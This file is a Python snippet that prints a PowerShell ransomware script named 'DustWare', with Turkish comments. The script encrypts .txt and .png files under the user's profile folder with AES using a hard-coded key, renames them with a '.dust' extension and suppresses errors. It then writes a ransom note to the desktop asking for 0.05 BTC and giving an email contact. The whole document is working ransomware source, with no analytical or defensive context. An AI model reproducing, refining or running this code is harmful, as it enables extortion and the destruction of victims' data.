x = """# === AES Key ve IV ===
$AESKey = [System.Text.Encoding]::UTF8.GetBytes("yG4h7uP9sW1vZx2LkE3rD5c7tQ0mN6o8") # 32-byte key
$AESIV  = New-Object Byte[] (16) # IV = 16 null byte

# === Hedef Uzantılar ===
$targetExt = @(".txt", ".png")

# === Şifreleme Fonksiyonu ===
function Encrypt-File {
    param ($FilePath)

    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = "CBC"
        $aes.Padding = "PKCS7"
        $aes.Key = $AESKey
        $aes.IV = $AESIV
        $encryptor = $aes.CreateEncryptor()
        $encBytes = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)

        [System.IO.File]::WriteAllBytes($FilePath, $encBytes)
        Rename-Item $FilePath ($FilePath + ".dust")
    } catch {
        # hata bastır
    }
}

# === Dizinleri Gez ve Şifrele ===
$files = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue

foreach ($file in $files) {
    if ($targetExt -contains $file.Extension.ToLower()) {
        Encrypt-File $file.FullName
    }
}

# === Ransom Not ===
$note = @"
Your files have been encrypted by DustWare.

To recover them, send 0.05 BTC to the address:
1A2b3C4d5E6f7G8h9i0JdustWallet

Then email us: dust@protonmail.com
"@

Set-Content -Path "$env:USERPROFILE\Desktop\READ_ME.txt" -Value $note
"""
print(x)